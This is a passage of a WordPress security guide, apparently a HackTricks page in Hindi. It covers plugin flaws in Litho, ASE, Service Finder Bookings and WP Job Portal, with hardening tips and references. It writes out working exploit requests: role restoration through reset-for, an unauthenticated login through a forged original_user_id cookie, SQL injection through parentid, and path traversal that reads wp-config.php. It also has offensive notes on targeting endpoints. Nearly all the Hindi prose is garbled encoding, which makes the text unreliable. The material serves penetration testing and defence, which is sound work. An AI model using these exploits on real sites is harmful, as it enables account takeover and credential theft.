* рдкрдереЛрдВ рдореЗрдВ рд╕рд╛рдлрд╝ рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдЬреЛрдбрд╝рдирд╛ (рджреЗрдЦреЗрдВ `$_POST`, `$_GET`, `$_REQUEST`)ред
* `check_ajax_referer()` рдФрд░ `current_user_can()`/`is_user_logged_in()` рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ред

#### рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// тАж proceed тАж
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ЁЯФТ  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **рд╣рдореЗрд╢рд╛** рдХрд┐рд╕реА рднреА write/delete рдСрдкрд░реЗрд╢рди рдХреЛ рдбрд┐рд╕реНрдХ рдкрд░ privileged рдорд╛рдиреЗрдВ рдФрд░ рджреЛрдмрд╛рд░рд╛ рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:
> тАв Authentication  тАв Authorisation  тАв Nonce  тАв Input sanitisation  тАв Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

рдХрдИ plugins рдПрдХ "view as role" рдпрд╛ temporary role-switching feature рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдореВрд▓ role(s) рдХреЛ user meta рдореЗрдВ рд╕реЗрд╡ рдХрд░рдХреЗ рдмрд╛рдж рдореЗрдВ restore рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рдЦрддреЗ рд╣реИрдВред рдпрджрд┐ restoration path рдХреЗрд╡рд▓ request parameters (e.g., `$_REQUEST['reset-for']`) рдФрд░ plugin-maintained рд╕реВрдЪреА рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ capabilities рдФрд░ рд╡реИрдз nonce рдХреА рдЬрд╛рдБрдЪ рдирд╣реАрдВ рдХрд░рддрд╛, рддреЛ рдпрд╣ рдПрдХ vertical privilege escalation рдмрди рдЬрд╛рддрд╛ рд╣реИред

рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЙрджрд╛рд╣рд░рдг Admin and Site Enhancements (ASE) plugin (тЙд 7.6.2.1) рдореЗрдВ рдкрд╛рдпрд╛ рдЧрдпрд╛ред reset branch рдиреЗ roles рдХреЛ `reset-for=<username>` рдХреЗ рдЖрдзрд╛рд░ рдкрд░ restore рдХрд┐рдпрд╛ рдЕрдЧрд░ username internal array `$options['viewing_admin_as_role_are']` рдореЗрдВ рдореМрдЬреВрдж рд╣реЛ, рд▓реЗрдХрд┐рди current roles рдХреЛ рд╣рдЯрд╛рдиреЗ рдФрд░ user meta `_asenha_view_admin_as_original_roles` рд╕реЗ saved roles рдХреЛ рдлрд┐рд░ рд╕реЗ рдЬреЛрдбрд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рди рддреЛ `current_user_can()` рдЪреЗрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдФрд░ рди рд╣реА рдХреЛрдИ nonce verification:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Why itтАЩs exploitable

- рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЗ рдмрд┐рдирд╛ `$_REQUEST['reset-for']` рдФрд░ plugin рд╡рд┐рдХрд▓реНрдк рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИред
- рдпрджрд┐ рдХрд┐рд╕реА user рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ `_asenha_view_admin_as_original_roles` рдореЗрдВ рдЙрдЪреНрдЪ-рдкреНрд░рд╛рдзрд┐рдХрд╛рд░ рд╕рд╣реЗрдЬреЗ рдЧрдП рдереЗ рдФрд░ рдмрд╛рдж рдореЗрдВ рдЙрдиреНрд╣реЗрдВ рдбрд╛рдЙрдирдЧреНрд░реЗрдб рдХрд┐рдпрд╛ рдЧрдпрд╛, рддреЛ рд╡реЗ reset path рдХреЛ рд╣рд┐рдЯ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- рдХреБрдЫ deployments рдореЗрдВ, рдХреЛрдИ рднреА рдкреНрд░рдорд╛рдгреАрдХреГрдд user `viewing_admin_as_role_are` рдореЗрдВ рдЕрднреА рднреА рдореМрдЬреВрдж рдХрд┐рд╕реА рдЕрдиреНрдп username рдХреЗ рд▓рд┐рдП reset рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдЯреВрдЯреА рд╣реБрдИ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдЬрд╛рдБрдЪ)ред

Attack prerequisites

- рдХрдордЬреЛрд░ plugin рд╕рдВрд╕реНрдХрд░рдг рдЬрд┐рд╕рдореЗрдВ рдпрд╣ рдлреАрдЪрд░ рд╕рдХреНрд╖рдо рд╣реЛред
- рд▓рдХреНрд╖рд┐рдд рдЦрд╛рддрд╛ рдХреЗ user meta рдореЗрдВ рдкрд╣рд▓реЗ рдХреЗ рдЙрдкрдпреЛрдЧ рд╕реЗ рдПрдХ рдЕрд╡рд╢рд┐рд╖реНрдЯ рдЙрдЪреНрдЪ-рдкреНрд░рд╛рдзрд┐рдХрд╛рд░ рд░реЛрд▓ рдореМрдЬреВрдж рд╣реЛрдирд╛ред
- рдХреЛрдИ рднреА рдкреНрд░рдорд╛рдгреАрдХреГрдд рд╕рддреНрд░; reset flow рдкрд░ nonce/capability рдХреА рдХрдореАред

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
On vulnerable builds this removes current roles and re-adds the saved original roles (e.g., `administrator`), effectively escalating privileges.

Detection checklist

- рдРрд╕реА role-switching рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬреЛ user meta рдореЗрдВ тАЬрдореВрд▓ рднреВрдорд┐рдХрд╛рдПрдБтАЭ (рдЙрджрд╛., `_asenha_view_admin_as_original_roles`) рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддреА рд╣реИрдВред
- Identify reset/restore paths that:
- `$_REQUEST` / `$_GET` / `$_POST` рд╕реЗ usernames рдкрдврд╝рддреЗ рд╣реИрдВред
- `add_role()` / `remove_role()` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ roles рдмрджрд▓рддреЗ рд╣реИрдВ рдмрд┐рдирд╛ `current_user_can()` рдФрд░ `wp_verify_nonce()` / `check_admin_referer()` рдХреЗред
- рдХрд┐рд╕реА plugin option array (рдЙрджрд╛., `viewing_admin_as_role_are`) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ authorize рдХрд░рддреЗ рд╣реИрдВ рдмрдЬрд╛рдп actor рдХреА capabilities рдХреЗред

Hardening

- рд╣рд░ state-changing рдмреНрд░рд╛рдВрдЪ рдкрд░ capability checks рд▓рд╛рдЧреВ рдХрд░реЗрдВ (рдЙрджрд╛., `current_user_can('manage_options')` рдпрд╛ рдЕрдзрд┐рдХ рдХрдбрд╝рд╛)ред
- рд╕рднреА role/permission рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЗ рд▓рд┐рдП nonces рдЕрдирд┐рд╡рд╛рд░реНрдп рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ verify рдХрд░реЗрдВ: `check_admin_referer()` / `wp_verify_nonce()`ред
- рдХрднреА рднреА request-supplied usernames рдкрд░ рднрд░реЛрд╕рд╛ рди рдХрд░реЗрдВ; authenticated actor рдФрд░ рд╕реНрдкрд╖реНрдЯ рдиреАрддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ target user рдХреЛ server-side рдкрд░ resolve рдХрд░реЗрдВред
- рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓/role рдЕрдкрдбреЗрдЯреНрд╕ рдкрд░ тАЬoriginal rolesтАЭ рд╕реНрдЯреЗрдЯ рдХреЛ invalid рдХрд░ рджреЗрдВ рддрд╛рдХрд┐ stale рдЙрдЪреНрдЪ-рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬрд╝ рдкреБрдирд░реНрд╕реНрдерд╛рдкрдирд╛ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗ:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- рдЕрд╕реНрдерд╛рдпреА рднреВрдорд┐рдХрд╛ рдкрд░рд┐рд╡рд░реНрддрди рдХреЗ рд▓рд┐рдП рдиреНрдпреВрдирддрдо state рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рдФрд░ time-limited, capability-guarded tokens рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВред

---

### Unauthenticated privilege escalation via cookieтАСtrusted user switching on public `init` (Service Finder тАЬsf-bookingтАЭ)

рдХреБрдЫ plugins рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ `init` hook рдкрд░ user-switching helpers рдХреЛ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ рдФрд░ рдкрд╣рдЪрд╛рди client-controlled cookie рд╕реЗ рдирд┐рдХрд╛рд▓рддреЗ рд╣реИрдВред рдпрджрд┐ рдХреЛрдб `wp_set_auth_cookie()` рдХреЛ authentication, capability рдФрд░ рдПрдХ рд╡реИрдз nonce рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдП рдмрд┐рдирд╛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХреЛрдИ рднреА unauthenticated рд╡рд┐рдЬрд╝рд┐рдЯрд░ рдХрд┐рд╕реА рднреА arbitrary user ID рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

Typical vulnerable pattern (simplified from Service Finder Bookings тЙд 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ЁЯФе sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
рдХреНрдпреЛрдВ рдпрд╣ рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рд╣реИ

- рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ `init` hook рд╣реИрдВрдбрд▓рд░ рдХреЛ рдЧреИрд░-рдкреНрд░рдорд╛рдгреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдБрдЪрдиреЗ рдпреЛрдЧреНрдп рдмрдирд╛рддрд╛ рд╣реИ (рдХреЛрдИ `is_user_logged_in()` рдЧрд╛рд░реНрдб рдирд╣реАрдВ)ред
- рдкрд╣рдЪрд╛рди рдХреНрд▓рд╛рдЗрдВрдЯ-рдкрд░рд┐рд╡рд░реНрддрдиреАрдп cookie (`original_user_id`) рд╕реЗ рдирд┐рдХрд╛рд▓реА рдЬрд╛рддреА рд╣реИред
- рд╕реАрдзреЗ `wp_set_auth_cookie($uid)` рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреЛ рдмрд┐рдирд╛ рдХрд┐рд╕реА capability/nonce рдЬрд╛рдБрдЪ рдХреЗ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░ рджреЗрддрд╛ рд╣реИред

рд╢реЛрд╖рдг (рдЧреИрд░-рдкреНрд░рдорд╛рдгреАрдХреГрдд)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs рд╡реНрдпрд╛рдкрдХ рдкреИрдЯрд░реНрди (SQLi, XSS, LFI) рдХреЗ рд▓рд┐рдП рдЯреНрдпреВрди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдХрдИ highтАСimpact WordPress/plugin flaws application-specific logic/auth рдмрдЧ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рддрдм рддрдХ рд╕рд╛рдорд╛рдиреНрдп рдЯреНрд░реИрдлрд╝рд┐рдХ рдЬреИрд╕реЗ рджрд┐рдЦрддреЗ рд╣реИрдВ рдЬрдм рддрдХ рдЗрдВрдЬрди WordPress routes рдФрд░ plugin semantics рдХреЛ рди рд╕рдордЭреЗред

Offensive notes

- рдкреНрд▓рдЧрдЗрди-рд╡рд┐рд╢рд┐рд╖реНрдЯ endpoints рдХреЛ clean payloads рдХреЗ рд╕рд╛рде рд▓рдХреНрд╖рд┐рдд рдХрд░реЗрдВ: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- рдкрд╣рд▓реЗ unauth paths рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes)ред Default payloads рдЕрдХреНрд╕рд░ рдмрд┐рдирд╛ obfuscation рдХреЗ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВред
- рд╕рд╛рдорд╛рдиреНрдп high-impact рдорд╛рдорд▓реЗ: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- plugin CVEs рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП generic WAF signatures рдкрд░ рдирд┐рд░реНрднрд░ рди рд░рд╣реЗрдВред application-layer, vulnerability-specific virtual patches рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдпрд╛ рдЬрд▓реНрджреА рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВред
- code рдореЗрдВ negative regex filters рдХреА рдмрдЬрд╛рдп positive-security checks (capabilities, nonces, strict input validation) рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВред

## WordPress Protection

### Regular Updates

рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ WordPress, plugins, рдФрд░ themes рдЕрдк рдЯреВ рдбреЗрдЯ рд╣реИрдВред рдпрд╣ рднреА рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ automated updating wp-config.php рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **рдХреЗрд╡рд▓ рднрд░реЛрд╕реЗрдордВрдж WordPress plugins рдФрд░ themes рд╣реА рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ**ред

### рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд▓рдЧрдЗрдиреНрд╕

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **рдЕрдиреНрдп рд╕рд┐рдлрд╛рд░рд┐рд╢реЗрдВ**

- рдбрд┐рдлрд╝реЙрд▓реНрдЯ **admin** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣рдЯрд╛рдПрдБ
- **рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб** рдФрд░ **2FA** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
- рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рдХреА **рд╕рдореАрдХреНрд╖рд╛** рдХрд░реЗрдВ
- **рд▓реЙрдЧрд┐рди рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ** рддрд╛рдХрд┐ Brute Force attacks рдХреЛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗ
- **`wp-admin.php`** рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рдмрджрд▓реЗрдВ рдФрд░ рдХреЗрд╡рд▓ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ рдпрд╛ рдХреБрдЫ рд╡рд┐рд╢рд┐рд╖реНрдЯ IP рдкрддреЛрдВ рд╕реЗ рд╣реА рдкрд╣реБрдБрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВред


### Unauthenticated SQL Injection тАФ рдЕрдкрд░реНрдпрд╛рдкреНрдд рд╡реИрд▓рд┐рдбреЗрд╢рди рдХреЗ рдХрд╛рд░рдг (WP Job Portal <= 2.3.2)

The WP Job Portal recruitment plugin exposed a **savecategory** task that ultimately executes the following рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдХреЛрдб inside `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat тЬЧ
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** тАУ `parentid` рд╕реАрдзреЗ HTTP request рд╕реЗ рдЖрддрд╛ рд╣реИ.
2. **String concatenation inside the WHERE clause** тАУ `is_numeric()` / `esc_sql()` / prepared statement рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.
3. **Unauthenticated reachability** тАУ рд╣рд╛рд▓рд╛рдВрдХрд┐ action `admin-post.php` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ execute рд╣реЛрддрд╛ рд╣реИ, рдореМрдЬреВрдж рдХреЗрд╡рд▓ рдЬрд╛рдВрдЪ **CSRF nonce** (`wp_verify_nonce()` ) рд╣реИ, рдЬрд┐рд╕реЗ рдХреЛрдИ рднреА рд╡рд┐рдЬрд╝рд┐рдЯрд░ рдЙрд╕ рдкрдмреНрд▓рд┐рдХ рдкреЗрдЬ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ shortcode `[wpjobportal_my_resumes]` embed рдХрд░рддрд╛ рд╣реИред

#### рд╢реЛрд╖рдг

1. рдПрдХ рдирдпрд╛ nonce рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ arbitrary SQL inject рдХрд░реЗрдВ:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Response рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдП рдЧрдП query рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ рдпрд╛ database рдХреЛ рдмрджрд▓ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ SQLi рд╕рд╛рдмрд┐рдд рд╣реЛрддрд╛ рд╣реИред


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

рдПрдХ рдФрд░ рдЯрд╛рд╕реНрдХ, **downloadcustomfile**, рд╡рд┐рдЬрд╝рд┐рдЯрд░реНрд╕ рдХреЛ path traversal рдХреЗ рдЬрд░рд┐рдП рдбрд┐рд╕реНрдХ рдкрд░ рдореМрдЬреВрдж **рдХрд┐рд╕реА рднреА рдлрд╛рдЗрд▓** рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рдерд╛ред рдХрдордЬреЛрд░ sink `modules/customfield/model.php::downloadCustomUploadedFile()` рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реИ рдФрд░ concatenated **without sanitisation**ред рдлрд┐рд░ рд╕реЗ, рдПрдХрдорд╛рддреНрд░ рдмрд╛рдзрд╛ **CSRF nonce** рд╣реИ рдЬрд┐рд╕реЗ resume page рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
рд╕рд░реНрд╡рд░ `wp-config.php` рдХреА рд╕рд╛рдордЧреНрд░реА рд╡рд╛рдкрд╕ рдХрд░рддрд╛ рд╣реИ, leaking DB credentials and auth keysред

## рд╕рдВрджрд░реНрдн

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset тАУ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments тЙд 5.6.1 тАУ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation тАУ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
